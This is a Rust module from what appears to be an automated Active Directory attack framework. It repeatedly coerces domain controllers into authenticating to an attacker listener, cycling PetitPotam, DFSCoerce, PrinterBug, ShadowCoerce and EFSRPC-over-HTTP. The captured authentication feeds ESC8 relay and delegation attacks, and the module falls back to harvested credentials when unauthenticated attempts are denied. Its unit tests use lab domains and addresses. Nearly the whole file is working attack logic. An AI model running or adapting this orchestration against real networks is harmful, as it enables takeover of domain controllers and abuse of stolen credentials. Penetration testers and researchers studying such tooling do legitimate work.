//! auto_coercion -- trigger ESC8 relay and DC coercion.
//!
//! Replaced the boolean per-DC dedup with a phase-state struct that cycles
//! through unauthenticated coercion techniques on access-denied, and falls
//! back to authenticated coercion once a same-forest credential is available.
//! See `CoercionPhaseState` + `next_coercion_technique` for the cycling logic
//! and Bug F in the cross-forest DA plan doc for the motivation.

use std::sync::Arc;
use std::time::Duration;

use chrono::{DateTime, Utc};
use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Coercion primitives the orchestrator cycles through against a single DC,
/// in dispatch order. The authenticated variant is a distinct slot: it sits
/// at the bottom of the ladder and is only chosen once the unauth set is
/// exhausted *and* a same-forest credential exists in state.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum CoercionTechnique {
    /// MS-EFSRPC (PetitPotam) unauthenticated.
    PetitPotam,
    /// MS-DFSNM (DFSCoerce).
    DFSCoerce,
    /// MS-RPRN (PrinterBug).
    PrinterBug,
    /// MS-FSRVP (ShadowCoerce).
    ShadowCoerce,
    /// MS-EFSRPC over HTTP transport (port 80) — works against DCs where the
    /// SMB pipes are firewalled but the WebClient endpoint is exposed.
    EfsrpcHttp,
    /// Authenticated coercion (uses an in-hand credential to bypass the
    /// unauthenticated pipe denials). Bottom of the ladder.
    AuthenticatedDC,
}

impl CoercionPhaseState {
    /// True when the last recorded error matches an access-denied pattern
    /// (`RPC_S_ACCESS_DENIED`, `NO_AUTH_RECEIVED`, `STATUS_ACCESS_DENIED`).
    /// Used by the cycling logic to short-circuit the authenticated retry
    /// when every unauth attempt failed for the same reason (the SMB pipes
    /// themselves are reachable; only the auth was the problem).
    pub fn last_error_was_access_denied(&self) -> bool {
        let Some(ref err) = self.last_error else {
            return false;
        };
        let upper = err.to_uppercase();
        upper.contains("RPC_S_ACCESS_DENIED")
            || upper.contains("NO_AUTH_RECEIVED")
            || upper.contains("STATUS_ACCESS_DENIED")
    }
}

impl CoercionTechnique {
    /// Tool-side technique slug the worker expects in the `techniques` array
    /// of the coercion payload.
    pub fn as_slug(&self) -> &'static str {
        match self {
            Self::PetitPotam => "petitpotam",
            Self::DFSCoerce => "dfscoerce",
            Self::PrinterBug => "printerbug",
            Self::ShadowCoerce => "shadowcoerce",
            Self::EfsrpcHttp => "efsrpc_http",
            Self::AuthenticatedDC => "authenticated_dc",
        }
    }
}

/// Per-DC coercion phase state. Mutated by `auto_coercion` on each dispatch
/// and by the result-processing path on completion (last_error + cooldown).
#[derive(Debug, Clone, Default)]
pub struct CoercionPhaseState {
    pub techniques_tried: Vec<CoercionTechnique>,
    pub attempts: u32,
    /// Last observed error signal from a coercion completion (e.g.
    /// `RPC_S_ACCESS_DENIED`, `NO_AUTH_RECEIVED`). Populated by the result-
    /// processing path on each completed coercion task so future ticks can
    /// triage triage-style decisions (e.g. skip authenticated retry when the
    /// error indicates the pipe itself is missing, not the auth).
    pub last_error: Option<String>,
    pub cooldown_until: Option<DateTime<Utc>>,
}

/// Unauthenticated coercion ladder, in dispatch order. PetitPotam first
/// because it's the broadest (works on most lab DCs); EFSRPC-over-HTTP last
/// because it requires the WebClient endpoint.
const UNAUTH_LADDER: &[CoercionTechnique] = &[
    CoercionTechnique::PetitPotam,
    CoercionTechnique::DFSCoerce,
    CoercionTechnique::PrinterBug,
    CoercionTechnique::ShadowCoerce,
    CoercionTechnique::EfsrpcHttp,
];

/// Pick the next coercion technique to dispatch against this DC. Returns
/// `None` when every technique (including authenticated, if a credential is
/// available) has already been attempted — at which point the caller can
/// permanently dedup the DC.
///
/// Pure — extracted so the cycling logic can be unit-tested without standing
/// up a Dispatcher.
pub fn next_coercion_technique(
    phase: &CoercionPhaseState,
    has_authenticated_cred: bool,
) -> Option<CoercionTechnique> {
    if let Some(until) = phase.cooldown_until {
        if Utc::now() < until {
            return None;
        }
    }
    for tech in UNAUTH_LADDER {
        if !phase.techniques_tried.contains(tech) {
            return Some(tech.clone());
        }
    }
    if has_authenticated_cred
        && !phase
            .techniques_tried
            .contains(&CoercionTechnique::AuthenticatedDC)
    {
        // Only retry with auth when the unauth failures were access-denied
        // (the pipes are reachable, the auth was the problem). If the last
        // error was e.g. STATUS_PIPE_NOT_AVAILABLE the same pipe won't open
        // with creds either — skip and let the DC dedup permanently. An
        // empty last_error (first tick, no completion yet) defaults to
        // "try anyway" so we don't gate on signals we haven't seen.
        if phase.last_error.is_none() || phase.last_error_was_access_denied() {
            return Some(CoercionTechnique::AuthenticatedDC);
        }
    }
    None
}

/// True when state holds a credential whose realm matches one of the DC's
/// candidate domains. Caller passes the candidate domain list (typically
/// `state.domain_controllers` filtered to the DC IP).
pub fn has_authenticated_coercion_credential(state: &StateInner, target_domain: &str) -> bool {
    if target_domain.is_empty() {
        return false;
    }
    let dom_l = target_domain.to_lowercase();
    state.credentials.iter().any(|c| {
        !c.password.is_empty()
            && !c.username.is_empty()
            && c.domain.to_lowercase() == dom_l
            && !state.is_principal_quarantined(&c.username, &c.domain)
    })
}

/// A coercion work item: which DC to coerce, the next technique to try, and
/// (when the technique is authenticated) the credential to use.
#[derive(Debug, Clone)]
pub struct CoercionWorkItem {
    pub domain: String,
    pub dc_ip: String,
    pub technique: CoercionTechnique,
    pub authenticated_cred: Option<ares_core::models::Credential>,
}

/// Build the work items for this tick. Walks every DC in state, computes the
/// next un-tried technique per the cycling logic, and skips DCs that have
/// either exhausted the ladder or are still in cooldown. Excludes the
/// listener IP (a self-coerce loops back to the attacker).
///
/// Replaces the previous boolean `DEDUP_COERCED_DCS` gate. The dedup set is
/// only marked when the ladder is fully exhausted, so the caller can still
/// treat dedup as the "permanent" signal that no more coercion attempts will
/// reach this DC.
pub(crate) fn select_coercion_work(state: &StateInner, listener_ip: &str) -> Vec<CoercionWorkItem> {
    let mut out = Vec::new();
    let default_state = CoercionPhaseState::default();
    for (domain, dc_ip) in state.domain_controllers.iter() {
        if dc_ip.as_str() == listener_ip {
            continue;
        }
        if state.is_processed(DEDUP_COERCED_DCS, dc_ip) {
            continue;
        }
        let phase = state
            .coercion_phase_state
            .get(dc_ip)
            .unwrap_or(&default_state);
        let has_auth = has_authenticated_coercion_credential(state, domain);
        let Some(tech) = next_coercion_technique(phase, has_auth) else {
            continue;
        };
        let auth_cred = if tech == CoercionTechnique::AuthenticatedDC {
            let dom_l = domain.to_lowercase();
            state
                .credentials
                .iter()
                .find(|c| c.domain.to_lowercase() == dom_l && !c.password.is_empty())
                .cloned()
        } else {
            None
        };
        out.push(CoercionWorkItem {
            domain: domain.clone(),
            dc_ip: dc_ip.clone(),
            technique: tech,
            authenticated_cred: auth_cred,
        });
    }
    out
}

/// Triggers coercion attacks when ADCS ESC8 servers or unconstrained delegation hosts exist.
/// Interval: 30s.
pub async fn auto_coercion(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue,
        };

        let work: Vec<CoercionWorkItem> = {
            let state = dispatcher.state.read().await;
            select_coercion_work(&state, &listener)
        };

        for item in work {
            // Serialize coercion dispatches against the listener's port-445
            // mutex — see `Dispatcher::relay_slot` doc. Held across the
            // request_coercion await so a concurrent NTLM relay or ESC8
            // dispatch waits its turn instead of racing the bind.
            let _relay_guard = dispatcher.relay_slot.lock().await;
            let techs: Vec<&str> = vec![item.technique.as_slug()];
            match dispatcher
                .request_coercion(&item.dc_ip, &listener, &techs)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        dc = %item.dc_ip,
                        domain = %item.domain,
                        technique = %item.technique.as_slug(),
                        authenticated = item.authenticated_cred.is_some(),
                        "DC coercion dispatched"
                    );
                    let dc_ip = item.dc_ip.clone();
                    let mut state = dispatcher.state.write().await;
                    let phase = state.coercion_phase_state.entry(dc_ip.clone()).or_default();
                    if !phase.techniques_tried.contains(&item.technique) {
                        phase.techniques_tried.push(item.technique.clone());
                    }
                    phase.attempts = phase.attempts.saturating_add(1);

                    // Mark the dedup set only once the ladder is fully
                    // exhausted (no more techniques to try, even authenticated
                    // when a cred exists). This preserves the "permanent DC
                    // dedup" semantics that ntlm_relay / unconstrained rely on,
                    // while allowing the phase-state path to keep cycling
                    // techniques in between.
                    let has_auth = has_authenticated_coercion_credential(&state, &item.domain);
                    let phase_after = state
                        .coercion_phase_state
                        .get(&dc_ip)
                        .cloned()
                        .unwrap_or_default();
                    if next_coercion_technique(&phase_after, has_auth).is_none() {
                        state.mark_processed(DEDUP_COERCED_DCS, dc_ip.clone());
                        drop(state);
                        let _ = dispatcher
                            .state
                            .persist_dedup(&dispatcher.queue, DEDUP_COERCED_DCS, &dc_ip)
                            .await;
                    }
                }
                Ok(None) => {}
                Err(e) => {
                    let msg = e.to_string();
                    warn!(err = %msg, "Failed to dispatch coercion");
                    let mut state = dispatcher.state.write().await;
                    let phase = state
                        .coercion_phase_state
                        .entry(item.dc_ip.clone())
                        .or_default();
                    phase.last_error = Some(msg);
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_cred(user: &str, dom: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: format!("cred-{user}-{dom}"),
            username: user.into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: dom.into(),
            source: "test".into(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    #[test]
    fn select_coercion_empty_state() {
        let s = StateInner::new("op".into());
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn select_coercion_emits_known_dc() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_coercion_work(&s, "192.168.58.1");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].domain, "contoso.local");
        assert_eq!(work[0].dc_ip, "192.168.58.10");
        // First tick → PetitPotam (top of the ladder).
        assert_eq!(work[0].technique, CoercionTechnique::PetitPotam);
        assert!(work[0].authenticated_cred.is_none());
    }

    #[test]
    fn select_coercion_excludes_listener_ip() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.1".into());
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn select_coercion_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(DEDUP_COERCED_DCS, "192.168.58.10".into());
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn next_technique_starts_with_petitpotam() {
        let phase = CoercionPhaseState::default();
        assert_eq!(
            next_coercion_technique(&phase, false),
            Some(CoercionTechnique::PetitPotam)
        );
    }

    #[test]
    fn coercion_phase_state_cycles_techniques_on_failure() {
        let mut phase = CoercionPhaseState::default();
        // Simulate: PetitPotam tried → next is DFSCoerce
        phase.techniques_tried.push(CoercionTechnique::PetitPotam);
        assert_eq!(
            next_coercion_technique(&phase, false),
            Some(CoercionTechnique::DFSCoerce)
        );
        // DFSCoerce tried → next is PrinterBug
        phase.techniques_tried.push(CoercionTechnique::DFSCoerce);
        assert_eq!(
            next_coercion_technique(&phase, false),
            Some(CoercionTechnique::PrinterBug)
        );
        // PrinterBug tried → next is ShadowCoerce
        phase.techniques_tried.push(CoercionTechnique::PrinterBug);
        assert_eq!(
            next_coercion_technique(&phase, false),
            Some(CoercionTechnique::ShadowCoerce)
        );
        // ShadowCoerce tried → next is EfsrpcHttp
        phase.techniques_tried.push(CoercionTechnique::ShadowCoerce);
        assert_eq!(
            next_coercion_technique(&phase, false),
            Some(CoercionTechnique::EfsrpcHttp)
        );
        // Full unauth ladder exhausted with no cred → None (we don't promote
        // to authenticated until a credential lands).
        phase.techniques_tried.push(CoercionTechnique::EfsrpcHttp);
        assert_eq!(next_coercion_technique(&phase, false), None);
    }

    #[test]
    fn coercion_retries_with_auth_when_cred_arrives() {
        // Full unauth ladder tried — when a same-forest cred lands, the next
        // slot is the authenticated retry, not None.
        let mut phase = CoercionPhaseState::default();
        for tech in UNAUTH_LADDER {
            phase.techniques_tried.push(tech.clone());
        }
        assert_eq!(next_coercion_technique(&phase, false), None);
        assert_eq!(
            next_coercion_technique(&phase, true),
            Some(CoercionTechnique::AuthenticatedDC)
        );
        // After AuthenticatedDC is tried, nothing left.
        phase
            .techniques_tried
            .push(CoercionTechnique::AuthenticatedDC);
        assert_eq!(next_coercion_technique(&phase, true), None);
    }

    #[test]
    fn next_technique_honours_cooldown() {
        let phase = CoercionPhaseState {
            cooldown_until: Some(Utc::now() + chrono::Duration::seconds(300)),
            ..Default::default()
        };
        assert_eq!(next_coercion_technique(&phase, true), None);
    }

    #[test]
    fn has_authenticated_coercion_credential_finds_same_realm_cred() {
        let mut s = StateInner::new("op".into());
        s.credentials.push(make_cred("carol", "fabrikam.local"));
        assert!(has_authenticated_coercion_credential(&s, "fabrikam.local"));
        // Case-insensitive.
        assert!(has_authenticated_coercion_credential(&s, "FABRIKAM.LOCAL"));
        // Different realm: no match.
        assert!(!has_authenticated_coercion_credential(
            &s,
            "child.contoso.local"
        ));
    }

    #[test]
    fn has_authenticated_coercion_credential_skips_quarantined() {
        let mut s = StateInner::new("op".into());
        s.credentials.push(make_cred("carol", "fabrikam.local"));
        s.quarantine_principal("carol", "fabrikam.local");
        assert!(!has_authenticated_coercion_credential(&s, "fabrikam.local"));
    }

    #[test]
    fn select_coercion_promotes_to_authenticated_after_unauth_exhausted() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.20".into());
        s.credentials.push(make_cred("carol", "fabrikam.local"));
        // Pre-mark the entire unauth ladder as tried.
        let mut phase = CoercionPhaseState::default();
        for tech in UNAUTH_LADDER {
            phase.techniques_tried.push(tech.clone());
        }
        s.coercion_phase_state.insert("192.168.58.20".into(), phase);

        let work = select_coercion_work(&s, "192.168.58.1");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].technique, CoercionTechnique::AuthenticatedDC);
        assert!(
            work[0].authenticated_cred.is_some(),
            "authenticated slot must carry a credential"
        );
    }

    #[test]
    fn select_coercion_emits_multiple_dcs() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        let mut work = select_coercion_work(&s, "192.168.58.1");
        work.sort_by_key(|w| w.dc_ip.clone());
        assert_eq!(work.len(), 2);
        assert_eq!(work[0].dc_ip, "192.168.58.10");
        assert_eq!(work[1].dc_ip, "192.168.58.40");
    }

    #[test]
    fn authenticated_slot_skipped_when_last_error_is_pipe_not_available() {
        // Unauth exhausted but every failure was pipe-missing — the auth
        // retry won't open a pipe that doesn't exist, so the ladder ends.
        let mut phase = CoercionPhaseState::default();
        for tech in UNAUTH_LADDER {
            phase.techniques_tried.push(tech.clone());
        }
        phase.last_error = Some("STATUS_PIPE_NOT_AVAILABLE".into());
        assert_eq!(next_coercion_technique(&phase, true), None);
        // Flip to access-denied → auth retry becomes a candidate.
        phase.last_error = Some("RPC_S_ACCESS_DENIED".into());
        assert_eq!(
            next_coercion_technique(&phase, true),
            Some(CoercionTechnique::AuthenticatedDC)
        );
    }

    #[test]
    fn last_error_access_denied_helper() {
        let mut phase = CoercionPhaseState::default();
        assert!(!phase.last_error_was_access_denied());
        phase.last_error = Some("RPC_S_ACCESS_DENIED (0x5)".into());
        assert!(phase.last_error_was_access_denied());
        phase.last_error = Some("NO_AUTH_RECEIVED for petitpotam pipe".into());
        assert!(phase.last_error_was_access_denied());
        phase.last_error = Some("STATUS_PIPE_NOT_AVAILABLE".into());
        assert!(!phase.last_error_was_access_denied());
    }

    #[test]
    fn coercion_technique_slugs_stable() {
        // Lock the slug strings — the worker tool expects them verbatim.
        assert_eq!(CoercionTechnique::PetitPotam.as_slug(), "petitpotam");
        assert_eq!(CoercionTechnique::DFSCoerce.as_slug(), "dfscoerce");
        assert_eq!(CoercionTechnique::PrinterBug.as_slug(), "printerbug");
        assert_eq!(CoercionTechnique::ShadowCoerce.as_slug(), "shadowcoerce");
        assert_eq!(CoercionTechnique::EfsrpcHttp.as_slug(), "efsrpc_http");
        assert_eq!(
            CoercionTechnique::AuthenticatedDC.as_slug(),
            "authenticated_dc"
        );
    }
}
